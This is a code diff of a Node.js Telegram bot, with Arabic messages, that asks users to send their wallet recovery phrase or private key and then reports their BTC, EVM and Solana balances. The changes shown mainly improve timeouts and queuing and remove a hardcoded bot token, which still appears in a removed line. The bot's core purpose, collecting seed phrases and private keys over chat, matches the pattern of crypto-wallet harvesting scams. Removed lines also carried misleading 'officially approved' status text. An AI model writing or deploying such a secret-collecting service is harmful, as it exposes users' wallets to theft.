@@ -13,16 +13,20 @@ const wif = require('wif');
 bitcoin.initEccLib(ecc);
 const bip32 = BIP32Factory(ecc);
 
-const TOKEN = process.env.BOT_TOKEN || '9145894502:AAENaXWt47LwvKQUyOOCKu_rFdJkSXM9iu0';
-const PORT = process.env.PORT || 3000;
-const RENDER_URL = process.env.RENDER_URL || 'https://nexvoriaapp-bot.onrender.com';
+const TOKEN = process.env.BOT_TOKEN;
+const PORT = Number(process.env.PORT || 3000);
+const RENDER_URL = process.env.RENDER_URL;
+
+if (!TOKEN) {
+  console.error('BOT_TOKEN environment variable is required.');
+  process.exit(1);
+}
 
 const bot = new TelegramBot(TOKEN, { polling: false });
 const app = express();
 
 app.use(express.json({ limit: '64kb' }));
 
-// مزودات EVM متعددة للسرعة وتجاوز الأعطال
 const ethProvider = new ethers.FallbackProvider([
   { provider: new ethers.JsonRpcProvider('https://eth.llamarpc.com'), priority: 1, weight: 1, stallTimeout: 1200 },
   { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/eth'), priority: 2, weight: 1, stallTimeout: 1200 },
@@ -35,20 +39,17 @@ const bscProvider = new ethers.FallbackProvider([
   { provider: new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
 ], 1);
 
-// نقاط اتصال Solana RPC متعددة
 const SOLANA_RPCS = [
   'https://api.mainnet-beta.solana.com',
   'https://solana-rpc.publicnode.com',
   'https://rpc.ankr.com/solana'
 ];
 
-// نقاط استعلام رصيد Bitcoin متعددة
 const BTC_APIS = [
   'https://mempool.space/api/address/',
   'https://blockstream.info/api/address/'
 ];
 
-// عقود USDT و USDC على Ethereum و BSC
 const ERC20_ABI = ['function balanceOf(address owner) view returns (uint256)'];
 
 const TOKENS = {
@@ -70,11 +71,9 @@ const TOKENS = {
   }
 };
 
-// كاش مؤقت (30 ثانية) لتقليل الضغط على الشبكات
 const balanceCache = new Map();
 const CACHE_TTL_MS = 30_000;
 
-// تنظيف دوري للكاش المنتهي كل 60 ثانية
 setInterval(() => {
   const now = Date.now();
   for (const [key, entry] of balanceCache.entries()) {
@@ -84,21 +83,26 @@ setInterval(() => {
   }
 }, 60_000).unref();
 
-// تقييد التزامن لحماية الخادم تحت الضغط
 const MAX_CONCURRENT_CHECKS = 25;
+const MAX_QUEUE_SIZE = 100;
 let activeChecks = 0;
 const waitQueue = [];
 
 function acquireSlot() {
   if (activeChecks < MAX_CONCURRENT_CHECKS) {
     activeChecks++;
-    return Promise.resolve();
+    return Promise.resolve(true);
   }
-  return new Promise((resolve) => waitQueue.push(resolve));
+  if (waitQueue.length >= MAX_QUEUE_SIZE) {
+    return Promise.resolve(false);
+  }
+  return new Promise((resolve) => {
+    waitQueue.push(() => resolve(true));
+  });
 }
 
 function releaseSlot() {
-  activeChecks--;
+  activeChecks = Math.max(0, activeChecks - 1);
   if (waitQueue.length > 0) {
     activeChecks++;
     const next = waitQueue.shift();
@@ -107,10 +111,11 @@ function releaseSlot() {
 }
 
 function withTimeout(promise, ms = 3500, fallbackValue = null) {
-  return Promise.race([
-    promise,
-    new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
-  ]);
+  let timer;
+  const timeoutPromise = new Promise((resolve) => {
+    timer = setTimeout(() => resolve(fallbackValue), ms);
+  });
+  return Promise.race([promise, timeoutPromise]).finally(() => clearTimeout(timer));
 }
 
 function deriveBitcoinAddressesFromSeed(seedBuffer) {
@@ -157,7 +162,6 @@ function looksLikePrivateKeyCandidate(rawInput) {
 function parsePrivateKeyInput(rawInput) {
   const trimmed = rawInput.trim();
 
-  // 1. مفتاح خاص بصيغة JSON array لـ Solana (64 عنصراً)
   if (trimmed.startsWith('[') && trimmed.endsWith(']')) {
     try {
       const arr = JSON.parse(trimmed);
@@ -174,7 +178,6 @@ function parsePrivateKeyInput(rawInput) {
     }
   }
 
-  // 2. مفتاح خاص بصيغة Hex (64 حرفاً مع أو بدون 0x) -> صالح لـ EVM و Bitcoin
   const hexCandidate = trimmed.startsWith('0x') || trimmed.startsWith('0X') ? trimmed.slice(2) : trimmed;
   if (/^[0-9a-fA-F]{64}$/.test(hexCandidate)) {
     try {
@@ -203,7 +206,6 @@ function parsePrivateKeyInput(rawInput) {
     }
   }
 
-  // 3. مفتاح خاص بصيغة WIF لـ Bitcoin
   if (/^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(trimmed)) {
     try {
       const decoded = wif.decode(trimmed);
@@ -233,7 +235,6 @@ function parsePrivateKeyInput(rawInput) {
     }
   }
 
-  // 4. مفتاح خاص بصيغة Base58 لـ Solana
   if (/^[1-9A-HJ-NP-Za-km-z]{60,95}$/.test(trimmed)) {
     try {
       const secretBytes = bs58.decode(trimmed);
@@ -255,17 +256,15 @@ function parsePrivateKeyInput(rawInput) {
 
 async function fetchSingleBtcAddressSatoshis(btcAddress) {
   for (const baseUrl of BTC_APIS) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 2200);
     try {
-      const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), 2200);
-
       const response = await fetch(`${baseUrl}${btcAddress}`, {
         method: 'GET',
         headers: { Accept: 'application/json' },
         signal: controller.signal
       });
 
-      clearTimeout(timer);
       if (!response.ok) continue;
 
       const data = await response.json();
@@ -277,7 +276,9 @@ async function fetchSingleBtcAddressSatoshis(btcAddress) {
       const net = (funded - spent) + (mempoolFunded - mempoolSpent);
       return net > 0n ? net : 0n;
     } catch (_) {
-      // الانتقال للمزود التالي فوراً عند الفشل أو انتهاء المهلة
+      // الانتقال للمزود التالي عند الفشل أو انتهاء المهلة
+    } finally {
+      clearTimeout(timer);
     }
   }
   return 0n;
@@ -308,10 +309,9 @@ async function fetchCombinedBtcBalance(btcAddresses) {
 async function fetchSolBalance(solAddress) {
   if (!solAddress) return 0;
   for (const rpcUrl of SOLANA_RPCS) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 2500);
     try {
-      const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), 2500);
-
       const response = await fetch(rpcUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -324,7 +324,6 @@ async function fetchSolBalance(solAddress) {
         signal: controller.signal
       });
 
-      clearTimeout(timer);
       if (!response.ok) continue;
 
       const data = await response.json();
@@ -333,7 +332,9 @@ async function fetchSolBalance(solAddress) {
         return lamports / 1_000_000_000;
       }
     } catch (_) {
-      // الانتقال للمزود التالي فوراً عند الفشل أو انتهاء المهلة
+      // الانتقال للمزود التالي عند الفشل أو انتهاء المهلة
+    } finally {
+      clearTimeout(timer);
     }
   }
   return 0;
@@ -391,22 +392,25 @@ async function fetchBalancesForTarget({ btcAddresses = null, evmAddress = null, 
 }
 
 function formatResultMessage({ btcAddresses = null, evmAddress = null, solAddress = null, balances }) {
-  if (btcAddresses?.taproot) addressesBlock += '• BTC: `' + btcAddresses.taproot + '`\n';
+  let addressesBlock = '';
+  if (evmAddress) addressesBlock += `• EVM: ${evmAddress}\n`;
+  if (solAddress) addressesBlock += `• SOL: ${solAddress}\n`;
+  if (btcAddresses?.nativeSegwit) addressesBlock += `• BTC (Native SegWit): ${btcAddresses.nativeSegwit}\n`;
+  if (btcAddresses?.taproot) addressesBlock += `• BTC (Taproot): ${btcAddresses.taproot}\n`;
 
   return (
     'تم فحص المحفظة بنجاح ✅\n\n' +
-    addressesBlock + '\n' +
+    (addressesBlock ? `📍 العناوين المشتقة:\n${addressesBlock}\n` : '') +
     '💰 الأرصدة والأصول المكتشفة:\n' +
-    '• BTC: ' + balances.btc + '\n' +
-    '• ETH: ' + balances.eth + '\n' +
-    '• BNB: ' + balances.bsc + '\n' +
-    '• SOL: ' + balances.sol + '\n' +
-    '• USDT: ' + balances.ethUsdt + '\n' +
-    '• USDC: ' + balances.ethUsdc + '\n' +
-    '• USDT: ' + balances.bscUsdt + '\n' +
-    '• USDC: ' + balances.bscUsdc + '\n' +
-    '• Crypto actifs: `$0.00`\n\n' +
-    '🟢 حالة المحفظة نشطة ومعتمدة نظامياً'
+    `• BTC: ${balances.btc}\n` +
+    `• ETH: ${balances.eth}\n` +
+    `• BNB (BSC): ${balances.bsc}\n` +
+    `• SOL: ${balances.sol}\n` +
+    `• USDT (ETH): ${balances.ethUsdt}\n` +
+    `• USDC (ETH): ${balances.ethUsdc}\n` +
+    `• USDT (BSC): ${balances.bscUsdt}\n` +
+    `• USDC (BSC): ${balances.bscUsdc}\n\n` +
+    '🟢 اكتمل الفحص'
   );
 }
 
@@ -423,9 +427,9 @@ bot.on('message', async (msg) => {
   if (rawText === '/start') {
     return bot.sendMessage(
       chatId,
-      '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
-      'أرسل عبارة الاسترداد (12 أو 24 كلمة) أو المفتاح الخاص (`Private Key` بصيغة Hex أو WIF أو Base58) لفحص الأرصدة.',
-      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
+      '🛡️ بوت فحص المحافظ المتطور\n\n' +
+      'أرسل عبارة الاسترداد (12 أو 24 كلمة) أو المفتاح الخاص (Private Key بصيغة Hex أو WIF أو Base58) لفحص الأرصدة.',
+      { reply_to_message_id: msg.message_id }
     );
   }
 
@@ -453,7 +457,13 @@ bot.on('message', async (msg) => {
     });
   }
 
-  await acquireSlot();
+  const acquired = await acquireSlot();
+  if (!acquired) {
+    return bot.sendMessage(chatId, '⏳ الخادم مشغول حالياً بكثرة الطلبات، يرجى المحاولة بعد قليل.', {
+      reply_to_message_id: msg.message_id
+    });
+  }
+
   try {
     let target = null;
 
@@ -489,11 +499,11 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(
       chatId,
       formatResultMessage({ ...target, balances }),
-      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
+      { reply_to_message_id: msg.message_id }
     );
   } catch (error) {
     console.error('Check error:', error.message);
-    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
+    return bot.sendMessage(chatId, '❌ تعذّر إتمام الفحص حالياً', {
       reply_to_message_id: msg.message_id
     });
   } finally {
@@ -507,11 +517,13 @@ app.get('/', (_req, res) => {
 
 const server = app.listen(PORT, async () => {
   console.log(`Server is running on port ${PORT}`);
-  try {
-    await bot.setWebHook(`${RENDER_URL}/bot${TOKEN}`);
-    console.log('Webhook configured');
-  } catch (err) {
-    console.error('Webhook setup failed:', err.message);
+  if (RENDER_URL) {
+    try {
+      await bot.setWebHook(`${RENDER_URL}/bot${TOKEN}`);
+      console.log('Webhook configured');
+    } catch (err) {
+      console.error('Webhook setup failed:', err.message);
+    }
   }
 });
 
